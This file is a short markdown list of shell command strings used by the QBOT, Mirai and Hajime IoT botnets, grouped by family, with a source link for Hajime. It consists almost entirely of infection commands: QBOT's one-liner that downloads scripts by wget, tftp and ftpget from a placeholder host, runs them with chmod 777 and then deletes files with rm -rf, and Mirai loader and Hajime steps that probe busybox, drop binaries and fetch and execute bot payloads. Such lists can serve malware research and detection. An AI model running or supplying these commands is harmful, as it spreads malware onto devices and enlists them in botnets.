# QBOT

	cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget %s; chmod 777 bins.sh; sh bins.sh; tftp %s -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g %s; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 %s ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
	
# Mirai

## Bot

	/bin/busybox MIRAI
	/bin/busybox ps

## Loader

	/bin/busybox cat /proc/%d/environ
	/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon
	/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
	rm %s/.t; rm %s/.sh; rm %s/.human
	/bin/busybox ps; /bin/busybox %s
	/bin/busybox cat /proc/mounts; /bin/busybox %s
	/bin/busybox cp /bin/echo %s; >%s; /bin/busybox chmod 777 %s; /bin/busybox %s
	/bin/busybox cat /bin/echo
	/bin/busybox wget; /bin/busybox tftp; /bin/busybox %s
	cat /proc/cpuinfo; /bin/busybox %s
	/bin/busybox cp %s %s; > %s; /bin/busybox chmod 777 %s; /bin/busybox %s
	/bin/busybox wget http://%s:%d/bins/%s.%s -O - > %s; /bin/busybox chmod 777 %s; /bin/busybox %s
	/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 %s; /bin/busybox %s
	./%s; ./%s %s.%s; /bin/busybox %s
	/bin/busybox cp %s %s; > %s; /bin/busybox chmod 777 %s; /bin/busybox %s
	rm -rf %s; > %s; /bin/busybox %s
	/bin/busybox wget; /bin/busybox tftp; /bin/busybox %s

# Hajime
From: https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf

	cat /proc/mounts; /bin/busybox %s
	cd /var; cat .s || cp /bin/echo .s; /bin/busybox %s
	/bin/busybox chmod 777 .s; /bin/busybox %s
	cat .s; /bin/busybox %s
	cp .s .i; >.i; ./.s>.i; ./.i; rm .s; /bin/busybox %s

